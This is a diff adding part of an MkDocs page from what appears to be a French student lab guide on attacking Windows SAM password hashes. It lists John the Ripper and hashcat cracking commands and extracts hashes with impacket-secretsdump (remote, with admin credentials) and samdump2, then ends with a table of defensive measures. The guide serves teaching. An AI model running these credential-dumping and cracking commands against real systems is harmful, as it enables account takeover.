+hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+</code></pre>
+<hr />
+<h2 id="07-commandes-de-reference-rapide">07 — Commandes de Référence Rapide</h2>
+<h3 id="john-the-ripper">John the Ripper</h3>
+<pre><code class="language-bash"># Vérifier la version
+john --version
+
+# Attaque par dictionnaire (format NT)
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Attaque par dictionnaire avec règles
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt
+
+# Force brute incrémentale
+john --format=NT --incremental hashes.txt
+
+# Force brute par masque (ex: 8 caractères tout type)
+john --format=NT --mask='?a?a?a?a?a?a?a?a' hashes.txt
+
+# Afficher les résultats trouvés
+john --show hashes.txt
+
+# Voir la progression
+john --status
+
+# Reprendre une session
+john --restore
+</code></pre>
+<h3 id="extraction-des-hachages">Extraction des hachages</h3>
+<pre><code class="language-bash"># Avec impacket (à distance)
+impacket-secretsdump Administrateur:'mdp'@IP_CIBLE
+
+# Avec samdump2 (fichiers locaux)
+samdump2 SYSTEM SAM &gt; hashes.txt
+
+# Décompresser rockyou.txt
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+</code></pre>
+<h3 id="utilitaires-divers">Utilitaires divers</h3>
+<pre><code class="language-bash"># Localiser les wordlists disponibles sur Kali
+ls /usr/share/wordlists/
+
+# Compter les lignes d'un dictionnaire
+wc -l /usr/share/wordlists/rockyou.txt
+
+# Supprimer le fichier .pot (repartir de zéro)
+rm ~/.john/john.pot
+
+# Afficher les formats supportés par John
+john --list=formats | grep -i NT
+</code></pre>
+<hr />
+<h3 id="mesures-de-protection-perspective-defensive">Mesures de protection (perspective défensive)</h3>
+<p>Ce laboratoire met en évidence l'importance des bonnes pratiques de sécurité :</p>
+<table>
+<thead>
+<tr>
+<th>Bonne pratique</th>
+<th>Raison</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mots de passe longs (16+ caractères)</td>
+<td>Rend la force brute impraticable</td>
+</tr>
+<tr>
+<td>Mots de passe complexes et uniques</td>
+<td>Résiste aux dictionnaires et aux règles</td>
+</tr>
+<tr>
+<td>Désactiver LM Hash (déjà le cas sur Win Vista+)</td>
+<td>LM est trivial à craquer</td>
+</tr>
+<tr>
+<td>Activer Windows Hello / MFA</td>
+<td>Rend le hash inutile sans le second facteur</td>
+</tr>
+<tr>
+<td>Principe du moindre privilège</td>
+<td>Limite l'impact d'un compte compromis</td>
+</tr>
+<tr>
+<td>Surveillance des événements 4624/4625</td>
+<td>Détecte les tentatives de connexion suspectes</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<p><em>Guide Kali Linux &amp; Attaque SAM · Référence pour Étudiants en Informatique · Usage pédagogique uniquement · 2025</em></p>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script src="../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "..";</script>
+    <script src="../js/theme_extra.js"></script>
+    <script src="../js/theme.js"></script>
+      <script src="../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
